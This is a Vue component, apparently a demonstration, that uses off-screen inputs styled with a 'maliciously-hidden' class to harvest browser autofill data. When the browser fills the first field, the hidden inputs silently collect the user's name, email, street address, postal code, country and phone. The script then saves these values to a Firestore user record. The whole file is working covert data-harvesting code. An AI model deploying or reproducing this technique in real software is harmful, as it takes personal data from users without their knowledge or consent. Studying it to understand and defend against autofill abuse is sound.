<script lang="ts" setup>
import { onAuthStateChanged } from 'firebase/auth'
import { doc, getDoc, setDoc, updateDoc } from 'firebase/firestore'

const uid = ref()

const firstname = ref('')
const lastname = ref('')
const email = ref('')
const streetAddress = ref('')
const postalCode = ref('')
const tel = ref('')
const country = ref('')

function update() {
  setTimeout(async () => {
    const updates: Record<string, string> = {}
    if (firstname.value) {
      updates.firstname = firstname.value
    }
    if (lastname.value) {
      updates.lastname = lastname.value
    }
    if (email.value) {
      updates.email = email.value
    }
    if (streetAddress.value) {
      updates.streetAddress = streetAddress.value
    }
    if (postalCode.value) {
      updates.postalCode = postalCode.value
    }
    if (tel.value) {
      updates.tel = tel.value
    }
    if (country.value) {
      updates.country = country.value
    }

    const userRef = doc(firestoreDb, 'users', uid.value)
    const user = await getDoc(userRef)
    if (user.exists()) {
      await updateDoc(userRef, updates)
    }
    else {
      await setDoc(userRef, updates)
    }
  }, 100)
}

onAuthStateChanged(firebaseAuth, (user) => {
  uid.value = user?.uid
})
</script>

<template>
  <div>
    <input
      v-model="firstname"
      name="firstname"
      autocomplete="given-name"
      type="text"
      class="maliciously-hidden"
      @change="update"
    >
    <input
      v-model="lastname"
      name="lastname"
      autocomplete="family-name"
      type="text"
      class="maliciously-hidden"
    >
    <input
      v-model="email"
      name="email"
      autocomplete="email"
      type="text"
      class="maliciously-hidden"
    >
    <input
      v-model="streetAddress"
      name="street-address"
      autocomplete="street-address"
      type="text"
      class="maliciously-hidden"
    >
    <input
      v-model="postalCode"
      name="postal-code"
      autocomplete="postal-code"
      type="text"
      class="maliciously-hidden"
    >
    <input
      v-model="country"
      name="country"
      autocomplete="country"
      type="text"
      class="maliciously-hidden"
    >
    <input
      v-model="tel"
      name="tel"
      autocomplete="tel"
      type="text"
      class="maliciously-hidden"
    >
  </div>
</template>

<style lang="css" scoped>
.maliciously-hidden {
  margin-left:-500px
}
</style>
